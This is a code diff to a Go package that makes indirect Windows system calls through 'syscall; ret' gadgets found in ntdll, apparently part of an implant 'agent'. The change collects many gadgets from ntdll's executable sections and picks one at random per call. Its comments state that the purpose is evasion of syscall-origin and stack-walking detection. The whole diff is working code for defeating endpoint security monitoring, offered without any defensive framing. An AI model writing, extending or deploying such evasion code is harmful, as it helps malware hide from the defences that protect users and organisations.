@@ -5,6 +5,7 @@ package syscall
 import (
 	"bytes"
 	"fmt"
+	"math/rand/v2"
 	"sort"
 	"strings"
 	"sync"
@@ -39,7 +40,9 @@ type OBJECT_ATTRIBUTES struct {
 	SecurityQualityOfService uintptr
 }
 
-// SyscallInfo holds the execution parameters for an indirect system call
+// SyscallInfo holds the execution parameters for an indirect system call.
+// GadgetAddr is the default (first discovered) syscall gadget; InvokeSyscall
+// rotates across all discovered gadgets for evasion.
 type SyscallInfo struct {
 	SSN        uint32
 	GadgetAddr uintptr
@@ -47,14 +50,33 @@ type SyscallInfo struct {
 
 // SyscallTable manages the resolved system calls in memory
 type SyscallTable struct {
-	mu         sync.RWMutex
-	ntdllBase  uintptr
-	gadgetAddr uintptr
-	syscalls   map[string]SyscallInfo
+	mu        sync.RWMutex
+	ntdllBase uintptr
+	gadgets   []uintptr
+	syscalls  map[string]SyscallInfo
 }
 
-// Caches SyscallTable for later use
+// RuntimeSyscallTable caches the process-wide SyscallTable for later use.
+// It is written exactly once by GetRuntimeSyscallTable (or eagerly by the
+// agent at startup); treat it as read-only afterwards.
 var RuntimeSyscallTable *SyscallTable
+
+var (
+	runtimeTableOnce sync.Once
+	runtimeTableErr  error
+)
+
+// GetRuntimeSyscallTable returns the process-wide SyscallTable, initializing
+// it exactly once on first use. Safe for concurrent callers; the agent may
+// also initialize it eagerly at startup so syscalls fail fast.
+func GetRuntimeSyscallTable() (*SyscallTable, error) {
+	runtimeTableOnce.Do(func() {
+		if RuntimeSyscallTable == nil {
+			RuntimeSyscallTable, runtimeTableErr = InitializeSyscallTable()
+		}
+	})
+	return RuntimeSyscallTable, runtimeTableErr
+}
 
 // Assembly primitive declaration accepting variadic slice
 func executeSyscall(ssn uint32, gadget uintptr, args []uintptr) uint32
@@ -66,28 +88,63 @@ func (table *SyscallTable) InvokeSyscall(name string, args ...uintptr) (uint32, 
 		return 0, fmt.Errorf("system call %s not found in table", name)
 	}
 
-	status := executeSyscall(info.SSN, info.GadgetAddr, args)
+	status := executeSyscall(info.SSN, table.selectGadget(), args)
 	return status, nil
 }
 
-// Scan ntdll memory for a syscall gadget matching architecture-specific gadget patterns
-func findSyscallGadget(ntdllBase uintptr) uintptr {
-	exportRVA, err := getExportDirectoryRVA(ntdllBase)
-	searchSize := uintptr(exportRVA)
-	if err != nil || searchSize == 0 {
-		searchSize = 0x100000
+// selectGadget picks a syscall gadget for this invocation. Rotating across
+// multiple ntdll "syscall; ret" gadgets avoids presenting a single constant
+// call-site address to syscall-origin / stack-walking heuristics.
+func (table *SyscallTable) selectGadget() uintptr {
+	switch n := len(table.gadgets); {
+	case n == 1:
+		return table.gadgets[0]
+	case n > 1:
+		return table.gadgets[rand.IntN(n)]
 	}
+	return 0
+}
 
-	buffer := unsafe.Slice((*byte)(unsafe.Pointer(ntdllBase)), searchSize)
+// maxSyscallGadgets caps how many gadget candidates are collected for
+// rotation; a handful is plenty for evasion.
+const maxSyscallGadgets = 32
 
-	for _, pattern := range syscallGadgetPatterns {
-		index := bytes.Index(buffer, pattern)
-		if index != -1 {
-			return ntdllBase + uintptr(index)
+// findSyscallGadgets scans ntdll's executable sections for every occurrence
+// of the architecture-specific syscall gadget patterns. Returning multiple
+// gadgets lets callers rotate between call sites; scanning only executable
+// sections avoids false positives from matching byte sequences in data.
+func findSyscallGadgets(ntdllBase uintptr) []uintptr {
+	var gadgets []uintptr
+	seen := make(map[uintptr]struct{})
+
+	for _, rng := range executableRanges(ntdllBase) {
+		size := rng[1] - rng[0]
+		if size == 0 {
+			continue
+		}
+		buffer := unsafe.Slice((*byte)(unsafe.Pointer(rng[0])), size)
+
+		for _, pattern := range syscallGadgetPatterns {
+			offset := 0
+			for {
+				idx := bytes.Index(buffer[offset:], pattern)
+				if idx == -1 {
+					break
+				}
+				addr := rng[0] + uintptr(offset+idx)
+				if _, dup := seen[addr]; !dup {
+					seen[addr] = struct{}{}
+					gadgets = append(gadgets, addr)
+					if len(gadgets) >= maxSyscallGadgets {
+						return gadgets
+					}
+				}
+				offset += idx + len(pattern)
+			}
 		}
 	}
 
-	return 0
+	return gadgets
 }
 
 // InitializeSyscallTable builds the complete map of SSNs and gadget locations
@@ -97,8 +154,8 @@ func InitializeSyscallTable() (*SyscallTable, error) {
 		return nil, fmt.Errorf("failed to locate ntdll.dll in PEB")
 	}
 
-	gadgetAddr := findSyscallGadget(ntdllBase)
-	if gadgetAddr == 0 {
+	gadgets := findSyscallGadgets(ntdllBase)
+	if len(gadgets) == 0 {
 		return nil, fmt.Errorf("failed to locate syscall gadget in ntdll.dll")
 	}
 
@@ -138,15 +195,15 @@ func InitializeSyscallTable() (*SyscallTable, error) {
 
 	// Step 4: Populate the consolidated lookup map
 	table := &SyscallTable{
-		ntdllBase:  ntdllBase,
-		gadgetAddr: gadgetAddr,
-		syscalls:   make(map[string]SyscallInfo),
+		ntdllBase: ntdllBase,
+		gadgets:   gadgets,
+		syscalls:  make(map[string]SyscallInfo),
 	}
 
 	for ssn, entry := range entries {
 		table.syscalls[entry.Name] = SyscallInfo{
 			SSN:        uint32(ssn),
-			GadgetAddr: gadgetAddr,
+			GadgetAddr: gadgets[0],
 		}
 	}
 
